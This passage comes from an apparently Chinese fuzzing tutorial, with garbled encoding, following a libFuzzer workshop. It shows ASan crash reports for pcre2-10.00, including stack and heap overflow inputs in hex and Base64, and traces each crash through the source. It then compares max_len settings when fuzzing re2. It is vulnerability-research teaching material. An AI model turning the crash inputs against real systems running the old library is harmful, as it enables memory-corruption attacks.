sp 0x7ffe809dd8e8READ of size 1 at 0x7ffe809de45f thread T0 #0 0x5e1517 in match /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 #1 0x5a0624 in pcre2_match_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:6876:8 #2 0x5f5e64 in regexec /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:291:6 #3 0x551947 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:21:5 #4 0x459661 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #5 0x458ea5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #6 0x45b147 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #7 0x45be65 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #8 0x449c28 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #9 0x473092 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #10 0x7f0d3f5c3bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #11 0x41ddb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00-fsanitize_fuzzer+0x41ddb9)Address 0x7ffe809de45f is located in stack of thread T0 at offset 159 in frame #0 0x55136f in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:13 This frame has 6 object(s): [32, 40) '__dnew.i.i.i.i26' [64, 72) '__dnew.i.i.i.i' [96, 128) 'preg' (line 15) [160, 192) 'str' (line 16) &lt;== Memory access at offset 159 underflows this variable [224, 256) 'pat' (line 17) [288, 328) 'pmatch' (line 20)HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions *are* supported)SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in matchShadow bytes around the buggy address: 0x100050133c30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133c70: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 f8 f2 f2 f2=&gt;0x100050133c80: f8 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00 00 00 0x100050133c90: f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00 0x100050133ca0: 00 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00 0x100050133cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100050133cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==17319==ABORTINGMS: 1 ChangeBit-; base unit: 7a9e5264e8896a1d996088a56a315765c53c7b330x5c,0x43,0x2b,0x5c,0x53,0x2b,0xde,0xac,0xd4,0xa3,0x53,0x2b,0x21,0x21,0x68,\\\\C+\\\\S+\\xde\\xac\\xd4\\xa3S+!!hartifact_prefix='./'; Test unit written to ./crash-5ae911f7e958e646e05ebe28421183f6efc0bc88Base64: XEMrXFMr3qzUo1MrISFo SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in matchæŒ‡å‡ºåœ¨pcre2_match.cé‡Œå­˜åœ¨stackoverflowã€‚å¯¹æ¼æ´è¿›è¡Œå®šä½ï¼šåœ¨pcre2posix.cä¸­è°ƒç”¨äº†pcre2_match 12#in pcre2posix.crc = pcre2_match((const pcre2_code *)preg-&gt;re_pcre2_code,(PCRE2_SPTR)string + so, (eo - so), 0, options, md, NULL); pcre2_matchå®šä¹‰åœ¨pcre2_match.cä¸­ï¼Œåœ¨pcre2_matchä¸­è°ƒç”¨äº†matchå‡½æ•°ï¼š 12#in pcre2_match.crc = match(start_match, mb-&gt;start_code, start_match, 2, mb, NULL, 0); åœ¨æ‰§è¡Œmatchçš„è¿‡ç¨‹ä¸­å‡ºç°æ ˆæº¢å‡ºçš„ä½ç½®åœ¨äºï¼š 12345678910for(;;) { if (eptr == pp) goto TAIL_RECURSE; RMATCH(eptr, ecode, offset_top, mb, eptrb, RM46); if (rrc != MATCH_NOMATCH) RRETURN(rrc); eptr--; BACKCHAR(eptr); //overflowå¤„ if (ctype == OP_ANYNL &amp;&amp; eptr &gt; pp &amp;&amp; UCHAR21(eptr) == CHAR_NL &amp;&amp; UCHAR21(eptr - 1) == CHAR_CR) eptr--; } å½“æˆ‘ä»¥ä¸ºfuzzçš„å·¥ä½œå·²ç»å®Œæˆçš„æ—¶å€™ï¼Œåªæ˜¯å°è¯•ç€ä¿®æ”¹äº†ä¸€ä¸‹ç¼–è¯‘é“¾æ¥harnessæ—¶çš„é™æ€åº“ä¸ºå…¨éƒ¨åº“ï¼š 1clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/*.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer å†æ¬¡fuzzçš„ç»“æœä»¤æˆ‘æƒŠè®¶ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#605510 REDUCE cov: 3273 ft: 15706 corp: 6963/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 18/86 MS: 1 EraseBytes-#605733 NEW cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 29/86 MS: 3 ShuffleBytes-CopyPart-CMP- DE: &quot;+n&quot;-#605994 REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 36/86 MS: 1 EraseBytes-#606040 REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 19/86 MS: 1 EraseBytes-#606121 NEW cov: 3273 ft: 15708 corp: 6965/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 27/86 MS: 1 CopyPart-#606196 NEW cov: 3273 ft: 15709 corp: 6966/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 86/86 MS: 5 ChangeASCIIInt-ChangeBit-ChangeBit-ChangeASCIIInt-CrossOver-===================================================================10857==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110001625ea at pc 0x00000055d548 bp 0x7ffccf4098f0 sp 0x7ffccf4098e8WRITE of size 1 at 0x6110001625ea thread T0 #0 0x55d547 in _pcre2_ord2utf_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 #1 0x4f60f4 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2870:20 #2 0x4f5dd0 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2820:18 #3 0x4e03e0 in compile_branch /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:3923:11 #4 0x4d3f2f in compile_regex /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:6723:8 #5 0x4d136c in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7734:7 #6 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23 #7 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12 #8 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15 #9 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3 #10 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19 #11 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5 #12 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6 #13 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10 #14 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #15 0x41deb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2_10.00_fuzzer+0x41deb9)0x6110001625ea is located 0 bytes to the right of 234-byte region [0x611000162500,0x6110001625ea)allocated by thread T0 here: #0 0x495dbd in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x4d0953 in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7656:3 #2 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23 #3 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12 #4 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15 #5 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3 #6 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19 #7 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5 #8 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6 #9 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10 #10 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8Shadow bytes around the buggy address: 0x0c2280024460: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c2280024470: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c2280024480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280024490: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c22800244a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0c22800244b0: 00 00 00 00 00 00 00 00 00 00 00 00 00[02]fa fa 0x0c22800244c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22800244d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22800244e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c22800244f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2280024500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==10857==ABORTINGMS: 5 InsertRepeatedBytes-CMP-CrossOver-ChangeBit-CrossOver- DE: &quot;+\\xc6&quot;-; base unit: ce48e02587af5cb5d3e84053d6d5b4545bbb6e320x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x3f,0x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x2a,0x63,0x20,0x20,0x20,0x25,0xc6,0xa4,0x1a,0x2d,0x5b,0x43,0x1a,0x2d,0xc6,0xa4,0x5d,0x50,0x2a,0x5d,0x50,0x2a,0x5e,0x58,0x42,0x5c,0x5c,0x3f,0x77,0xc,0x5c,0x77,0x0,0x36,0x5c,0x20,0xa0,0xc0,0xec,0x2d,0x3f,0x5c,0x77,0x3f,0x5c,0x2d,0xac,0x3f,0x5c,[*]?[??\\\\S?[*]?[??\\\\S*c %\\xc6\\xa4\\x1a-[C\\x1a-\\xc6\\xa4]P*]P*^XB\\\\\\\\?w\\x0c\\\\w\\x006\\\\ \\xa0\\xc0\\xec-?\\\\w?\\\\-\\xac?\\\\artifact_prefix='./'; Test unit written to ./crash-849705875bb2098817f3299ee582e2207a568e63Base64: WypdP1s/P1xTP1sqXT9bPz9cUypjICAgJcakGi1bQxotxqRdUCpdUCpeWEJcXD93DFx3ADZcIKDA7C0/XHc/XC2sP1w=stat::number_of_executed_units: 606206stat::average_exec_per_sec: 255stat::new_units_added: 8960stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 598 å¾—åˆ°äº†ä¸€ä¸ªä¸ä¸€æ ·çš„crashã€‚ä½†è¿™ä¹Ÿåœ¨æƒ…ç†ä¹‹ä¸­ï¼Œé€šè¿‡é“¾æ¥ä¸åŒæˆ–æ›´å¤šçš„é™æ€åº“ã€‚åªè¦harnessç¨‹åºé€»è¾‘æ‰€èƒ½æ¶‰åŠåˆ°ï¼Œå°±æœ‰æœºä¼šå¾—åˆ°ä¸åŒé™æ€åº“é‡Œçš„crashã€‚é€šè¿‡SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8æˆ‘ä»¬äº†è§£åˆ°åœ¨pcre2_ord2utf.cä¸­å­˜åœ¨heapoverflowçš„æ¼æ´ã€‚åŒæ ·å¯¹æ¼æ´è¿›è¡Œå®šä½ï¼šè¿™æ¬¡çš„å‡½æ•°è°ƒç”¨æœ‰ç‚¹å¤šï¼Œä¸€å±‚ä¸€å±‚çš„æ‰¾ï¼šé¦–å…ˆåœ¨pcre2posix.cä¸­è°ƒç”¨pcre2_compileï¼š 12preg-&gt;re_pcre2_code = pcre2_compile((PCRE2_SPTR)pattern, -1, options, &amp;errorcode, &amp;erroffset, NULL); è¯¥å‡½æ•°å®šä¹‰åœ¨pcre2_compile.cä¸­ï¼Œç„¶ååˆè°ƒç”¨äº†compile_regex: 12(void)compile_regex(re-&gt;overall_options, &amp;code, &amp;ptr, &amp;errorcode, FALSE, FALSE, 0, 0, &amp;firstcu, &amp;firstcuflags, &amp;reqcu, &amp;reqcuflags, NULL, &amp;cb, NULL); ä¹‹ååœ¨å‡½æ•°compile_regexä¸­åˆè°ƒç”¨äº†compile_branchï¼š 1234567if (!compile_branch(&amp;options, &amp;code, &amp;ptr, errorcodeptr, &amp;branchfirstcu, &amp;branchfirstcuflags, &amp;branchreqcu, &amp;branchreqcuflags, &amp;bc, cond_depth, cb, (lengthptr == NULL)? NULL : &amp;length)) { *ptrptr = ptr; return FALSE; } compile_branchä¸­åˆè°ƒç”¨äº†add_to_classï¼š 12class_has_8bitchar += add_to_class(classbits, &amp;class_uchardata, options, cb, c, d); æ¥ç€add_to_classè°ƒç”¨PRIV: 123456else if (start == end) { *uchardata++ = XCL_SINGLE; uchardata += PRIV(ord2utf)(start, uchardata); } } PRIVå®šä¹‰åœ¨pcre2_ord2utf.cä¸­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738unsigned intPRIV(ord2utf)(uint32_t cvalue, PCRE2_UCHAR *buffer){/* Convert to UTF-8 */#if PCRE2_CODE_UNIT_WIDTH == 8register int i, j;for (i = 0; i &lt; PRIV(utf8_table1_size); i++) if ((int)cvalue &lt;= PRIV(utf8_table1)[i]) break;buffer += i;for (j = i; j &gt; 0; j--) { *buffer-- = 0x80 | (cvalue &amp; 0x3f); //æ­¤å¤„å¯¹äºå†…å­˜æŒ‡é’ˆå¾ªç¯æ“ä½œç”±äºé™åˆ¶æ¡ä»¶ä¸å½“å¯¼è‡´å‡ºç°äº†heap_overflow cvalue &gt;&gt;= 6; }*buffer = PRIV(utf8_table2)[i] | cvalue;return i + 1;/* Convert to UTF-16 */#elif PCRE2_CODE_UNIT_WIDTH == 16if (cvalue &lt;= 0xffff) { *buffer = (PCRE2_UCHAR)cvalue; return 1; }cvalue -= 0x10000;*buffer++ = 0xd800 | (cvalue &gt;&gt; 10);*buffer = 0xdc00 | (cvalue &amp; 0x3ff);return 2;/* Convert to UTF-32 */#else*buffer = (PCRE2_UCHAR)cvalue;return 1;#endif} æ€»ç»“ä¸‹è¿™ä¸¤ä¸ªcrashï¼šç¬¬ä¸€ä¸ªcrashç”±harnessä¸­çš„regexechå‡½æ•°çš„åŒ¹é…é€»è¾‘è§¦å‘stack_overflowï¼Œä½äºpcre2_match.c:5968:11ï¼›ç¬¬äºŒä¸ªcrashç”±regcompå‡½æ•°çš„ç¼–è¯‘é€»è¾‘è§¦å‘heap_overflowï¼Œä½äºpcre2_ord2utf.c:92:12ã€‚ä¸€å±‚å±‚çš„å‡½æ•°è°ƒç”¨å…³ç³»åˆ†æå¾—è®©äººå¤´å¤§ï¼Œä½†è¿™ä¹Ÿæ­£ä½“ç°äº†æ¼æ´æŒ–æ˜ä¸­çš„â€œæŒ–æ˜â€äºŒå­—çš„å«ä¹‰ã€‚ fuzzing re2è¿™ä¸€ä¸ªä¾‹å­å°†è®©æˆ‘ä»¬æ„è¯†åˆ°max_lençš„é€‰æ‹©å¯¹äºfuzzæ•ˆç‡çš„å½±å“ã€‚re2æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„ã€åŸåˆ™æ€§çš„æ­£åˆ™è¡¨è¾¾å¼åº“ã€‚æ˜¯ç”±ä¸¤ä½æ¥åœ¨Googleçš„å¤§ç¥ç”¨C++å®ç°çš„ã€‚Goä¸­çš„regexpæ­£åˆ™è¡¨è¾¾å¼åŒ…ä¹Ÿæ˜¯ç”±re2å®ç°çš„ã€‚workshopæä¾›çš„æ˜¯re2-2014-12-09çš„ç‰ˆæœ¬ã€‚å…ˆæºç ç¼–è¯‘ï¼š 12345tar xzf re2.tgzcd re2export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;make cleanCXX=clang++ CXXFLAGS=&quot;$FUZZ_CXXFLAGS&quot; make -j æ¥ç€ç ”ç©¶harnessï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright (c) 2016 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;string&gt;#include &quot;re2/re2.h&quot;#include &quot;util/logging.h&quot;using std::string;void Test(const string&amp; buffer, const string&amp; pattern, const RE2::Options&amp; options) { RE2 re(pattern, options); if (!re.ok()) return; string m1, m2; int i1, i2; double d1; if (re.NumberOfCapturingGroups() == 0) { RE2::FullMatch(buffer, re); RE2::PartialMatch(buffer, re); } else if (re.NumberOfCapturingGroups() == 1) { RE2::FullMatch(buffer, re, &amp;m1); RE2::PartialMatch(buffer, re, &amp;i1); } else if (re.NumberOfCapturingGroups() == 2) { RE2::FullMatch(buffer, re, &amp;i1, &amp;i2); RE2::PartialMatch(buffer, re, &amp;m1, &amp;m2); } re2::StringPiece input(buffer); RE2::Consume(&amp;input, re, &amp;m1); RE2::FindAndConsume(&amp;input, re, &amp;d1); string tmp1(buffer); RE2::Replace(&amp;tmp1, re, &quot;zz&quot;); string tmp2(buffer); RE2::GlobalReplace(&amp;tmp2, re, &quot;xx&quot;); RE2::QuoteMeta(re2::StringPiece(pattern));}// Entry point for LibFuzzer.extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { if (size &lt; 1) return 0; RE2::Options options; size_t options_randomizer = 0; for (size_t i = 0; i &lt; size; i++) options_randomizer += data[i]; if (options_randomizer &amp; 1) options.set_encoding(RE2::Options::EncodingLatin1); options.set_posix_syntax(options_randomizer &amp; 2); options.set_longest_match(options_randomizer &amp; 4); options.set_literal(options_randomizer &amp; 8); options.set_never_nl(options_randomizer &amp; 16); options.set_dot_nl(options_randomizer &amp; 32); options.set_never_capture(options_randomizer &amp; 64); options.set_case_sensitive(options_randomizer &amp; 128); options.set_perl_classes(options_randomizer &amp; 256); options.set_word_boundary(options_randomizer &amp; 512); options.set_one_line(options_randomizer &amp; 1024); options.set_log_errors(false); const char* data_input = reinterpret_cast&lt;const char*&gt;(data); { string pattern(data_input, size); string buffer(data_input, size); Test(buffer, pattern, options); } if (size &gt;= 3) { string pattern(data_input, size / 3); string buffer(data_input + size / 3, size - size / 3); Test(buffer, pattern, options); } return 0;} å¯ä»¥çœ‹åˆ°harnessç”¨åˆ°äº†å¾ˆå¤šre2é‡Œçš„æ–¹æ³•ï¼Œæœ€åä½¿ç”¨FullMatchå’ŒPartialMatchæ¥å£è¿›è¡ŒåŒ¹é…bufferå’Œreã€‚å…¶ä¸­bufferæ˜¯ç”±data_inputå’Œsizeåˆå§‹åŒ–å¾—åˆ°ï¼ˆdata_inputç”±è¾“å…¥çš„dataç»æ— å…³ç±»å‹è½¬æ¢å¾—åˆ°ï¼‰ï¼Œreæ˜¯ç”±patternå’Œoptionså»ºç«‹çš„RE2å¯¹è±¡ã€‚æ³¨æ„åˆ°harnessé‡Œæœ‰å‡ ä¸ªæ¡ä»¶åˆ†æ”¯è¯­å¥ï¼Œé¦–å…ˆæ˜¯size&lt;1æ˜¯ç›´æ¥è¿”å›ï¼Œè¿˜æœ‰å°±æ˜¯å½“size&gt;=3æ—¶ï¼Œåˆå§‹åŒ–pattnå’Œbufferç”¨çš„æ˜¯size/3å’Œsize-size/3è¯´æ˜å®ƒå¯¹æˆ‘ä»¬çš„è¾“å…¥çš„sizeè¿›è¡Œäº†åˆ‡å‰²ï¼Œåˆå§‹åŒ–patternç”¨åˆ°çš„æ˜¯data_input + size / 3ï¼Œè€Œåˆå§‹åŒ–bufferæ˜¯ç”¨çš„ä¹‹åçš„data_inputã€‚è¿™æ ·ä½¿å¾—æˆ‘ä»¬æ ·ä¾‹çš„sizeä¼šå¯¹fuzzçš„è¿‡ç¨‹äº§ç”Ÿå½±å“ã€‚å¦‚æœsizeå¾ˆçŸ­ï¼Œå¯èƒ½æ— æ³•è§¦å‘crashï¼Œè€Œå¦‚æœsizeå¾ˆå¤§ï¼Œå¯¹harnessçš„æ‰§è¡ŒåŒ¹é…è¿‡ç¨‹å°±ä¼šæ›´åŠ è€—æ—¶ï¼Œå½±å“fuzzå¯»æ‰¾è¦†ç›–ç‚¹çš„æ•ˆç‡ã€‚ä¸‹é¢åšå‡ ä¸ªæµ‹è¯•ï¼Œæ¯”è¾ƒä¸€ä¸‹max_lenå¯¹fuzzè¿‡ç¨‹çš„å½±å“ï¼šç¼–è¯‘é“¾æ¥harnessï¼š 1clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=gnu++98 target.cc -I re2/ re2/obj/libre2.a -fsanitize=fuzzer -o re2_fuzzer ç”±äºä½¿ç”¨çš„re2ç‰ˆæœ¬è¾ƒè€äº†ï¼Œç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨äº†c++98æ ‡å‡†ã€‚ é¦–å…ˆæˆ‘ä»¬è®¾ç½®max_lenä¸º10ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats=1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus1ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ï¼š 12345678âœ 10 git:(master) âœ— ./re2_fuzzer ./corpus1 -print_final_stats=1 -max_len=10 -max_total_time=100Done 643760 runs in 101 second(s)stat::number_of_executed_units: 643760stat::average_exec_per_sec: 6373stat::new_units_added: 36stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 456 åªæ¢æµ‹åˆ°äº†36ä¸ªä»£ç å•å…ƒã€‚æ¥ç€è®¾ç½®max_lenä¸º100ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats=1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus2ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ï¼š 12345678./re2_fuzzer ./corpus2 -print_final_stats=1 -max_len=100 -max_total_time=100Done 233437 runs in 101 second(s)stat::number_of_executed_units: 233437stat::average_exec_per_sec: 2311stat::new_units_added: 50stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 675 æ¢æµ‹åˆ°äº†50ä¸ªä»£ç å•å…ƒ,æ„Ÿè§‰å·®åˆ«ä¸å¤§ã€‚ç„¶å¹´è®¾ç½®max_lenä¸º1000ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats=1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus3ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ï¼š 12345678./re2_fuzzer ./corpus3 -print_final_stats=1 -max_len=1000 -max_total_time=100Done 105935 runs in 101 second(s)stat::number_of_executed_units: 105935stat::average_exec_per_sec: 1048stat::new_units_added: 97stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 830 è¿™æ¬¡æ¢æµ‹åˆ°äº†97ä¸ªä»£ç å•å…ƒï¼Œæ˜¯ç¬¬äºŒä¸ªçš„2å€ï¼Œç¬¬ä¸€ä¸ªçš„3å€å·¦å³ã€‚æœ€åå†è®¾ç½®max_lenä¸º500ï¼Œæ‰§è¡Œæ—¶é—´ä¸º100ç§’,-print_final_stats=1æ‰“å°æœ€åçš„ç»“æœï¼Œcorpus4ä½œä¸ºè¯­æ–™åº“çš„å­˜æ”¾å¤„ 12345678./re2_fuzzer ./corpus4 -print_final_stats=1 -max_len=500 -max_total_time=100Done 119361 runs in 101 second(s)stat::number_of_executed_units: 119361stat::average_exec_per_sec: 1181stat::new_units_added: 117stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 827 ç»“æœä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œä¸åŒçš„max_lenå¯¹fuzzçš„æ•ˆç‡æœ‰ç€ä¸åŒçš„å½±å“ï¼Œå½“ç„¶è¿™ä¹Ÿå’Œä½ å†™çš„harnessæœ‰å…³ã€‚å› 